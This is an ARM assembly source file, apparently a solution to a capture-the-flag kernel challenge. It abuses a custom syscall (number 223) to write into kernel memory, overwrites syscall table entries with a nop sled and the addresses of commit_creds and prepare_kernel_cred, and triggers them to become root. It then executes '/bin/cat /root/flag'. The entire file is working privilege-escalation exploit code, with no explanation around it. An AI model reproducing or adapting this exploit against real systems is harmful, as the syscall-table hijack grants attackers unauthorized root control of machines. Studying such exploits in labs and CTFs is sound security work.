.globl _start

.section .text

_start:

mov r7, #223
ldr r0, =nopsled
ldr r1, =(0x8003f56c - 0xc)
svc #0

mov r7, #223
ldr r0, =commit_creds_updated_addr
ldr r1, =(0x8000e348 + 0x4*44)
svc #0

mov r7, #223
ldr r0, =prepare_kernel_cred_addr
ldr r1, =(0x8000e348 + 0x4*53)
svc #0

mov r7, #53
mov r0, #0
svc #0

mov r7, #44
svc #0

mov r7, #11
ldr r0, =command
ldr r1, =args 
svc #0
              
mov r7, #0    
svc #0        
              
.section .data
              
nopsled:      
mov r3, r3
mov r3, r3
mov r3, r3
.byte 0
commit_creds_updated_addr:
.long 0x8003F56C-0xC
.byte 0
prepare_kernel_cred_addr:
.long 0x8003F924
.byte 0
command:
.asciz "/bin/cat"
arg1:
.asciz "/root/flag"
args:
.long command
.long arg1
.long 0
